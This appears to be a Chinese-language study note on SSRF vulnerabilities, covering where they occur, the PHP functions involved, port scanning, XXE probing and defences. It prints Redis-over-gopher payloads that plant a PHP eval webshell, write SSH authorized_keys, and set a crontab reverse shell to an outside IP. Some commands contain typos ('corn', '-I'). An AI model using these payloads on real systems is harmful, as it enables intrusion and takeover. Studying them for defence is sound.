## SSRF漏洞原理
服务端请求伪造(Server-side Request Forge)是一种由攻击者构造形成,由服务端发起请求的安全漏洞。</br>
一般SSRF攻击目标是从外网无法访问的內部系统</br>
漏洞位置：</br>
（1）分享：通过url地址分享网页内容</br>
（2）转码服务</br>
（3）在线翻译</br>
（4）图片加载与下载：通过URL地址加载或下载图片</br>
（5）图片、文章收藏功能</br>
（6）未公开的api实现以及其他调用URL的功能</br>
（7）从URL关键字中寻找

## SSRF漏洞危害
（1）端口扫描</br>
（2）内网web应用指纹识别</br>
（3）攻击内网web应用</br>
（4）利用file协议读取本地文件等

## SSRF漏洞利用
### （1）相关危险函数
SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取的函数。以PHP为例，涉及到的函数有：</br>
file_get_content()——把文件写入字符串，当url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取</br>
fsockopen()——打开一个网络连接，或者Unix套接字连接</br>
curl_exec()——利用方式很多，常见的是通过file，dict，gopher三个协议来进行渗透</br>
![image](https://github.com/n4ttt/Sec-Note/assets/32692640/ec4272e5-24d2-4e62-b6a0-a961d16ee00f)

### （2）获取正常文件
提交参数：http://192.168.11.11/ssrf/?url=www.aaa.com/robots.txt</br>
返回robots.txt的内容。

### （3）端口扫描
当设置参数URL为内网地址时，则会泄露内网信息，比如内网的某个服务是否开放；</br>
提交参数：?url=192.168.11.100:3306</br>
返回结果：页面报错。端口没有开放</br>
提交参数：?url=192.168.11.100:22</br>
返回结果：SSH-2.0-OpenSSh_7.8pl Debian-1。端口开放。

### （4）内网web应用指纹识别
大多数web应用框架都有一些独特的文件和目录，通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜集漏洞进行攻击。</br>
例如：判断phpMyAdmin是否安装以及详细版本</br>
提交参数：?url=http://192.168.11.200/phpMyAdmin/README</br>
页面可能返回相应信息。

### （5）SSRF结合XXE漏洞利用（端口探测为例）
由于XML实体注入攻击可以利用http://协议，可以利用这点去探查内网，进行SSRF攻击。根据响应时长/长度判断端口是否开。</br>
XML内容：
```
<?xml version=”1.0” encoding=”utf-8”?>
<!DOCTYPE note[<!ENTITY xxe SYSTEM “http://192.168.11.100:3306/test/”>]>
<name>&xxe</name>
```

### （6）Redis配合gopher协议进行SSRF
gopher协议极大的拓宽了SSRF的攻击面。利用此协议可以攻击内网 的redis、ftp等，也可以发送GET、POST请求。</br>
利用条件：能未授权或者通过弱口令认证访问到redis服务器。</br>
**redis数据库特点：** </br>
未授权访问。在访问redis服务器时，不需要提供用户名和密码；</br>
具有root权限；</br>
可读写文件；</br>
默认端口：6379</br>
**redis常见的SSRF攻击方式：** </br>
（1）绝对路径写webshell</br>
前提：需要知道web的绝对路径</br>
构造payload（构造redis命令）：
```
flushall
set 1 ‘<?php eval($_POST[‘cmd’]);?>’
config set dbfilename shell.php
save
```
（2）写SSH公钥</br>
前提：目标机开启SSH服务</br>
说明：如果ssh目录存在，则直接写入~/.ssh/authorized_keys；如果不存在，则可以利用crontab创建该目录</br>
方法：本地生成RSA公钥私钥对，将公钥通过redis写入.ssh目录下的authorized_keys文件下，实现ssh免密登录。</br>
构造payload（构造redis命令）：
```
flushall
set 1 ‘生成的RSA公钥私钥对’
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```
（3）利用contrab计划任务反弹shell</br>
前提：这个方法只能在centos上使用，Ubuntu不能用</br>
contrab定时文件位置：</br>
![image](https://github.com/n4ttt/Sec-Note/assets/32692640/8a7f6ff8-8834-472d-be8e-7a5cc5af8053)

构造payload：
```
flushall
set 1 ‘\n\n*/1****bash -I >& /dev/tcp/192.168.11.100/2333 0>&1\n\n’
config set dir /var//spool/corn/
config set dbfilename root
save
```
## SSRF漏洞防御
（1）限制请求的端口只能为web端口</br>
（2）设置白名单，或限制内网IP，以防止对内网进行攻击</br>
（3）禁止30X跳转</br>
（4）屏蔽返回的详细信息
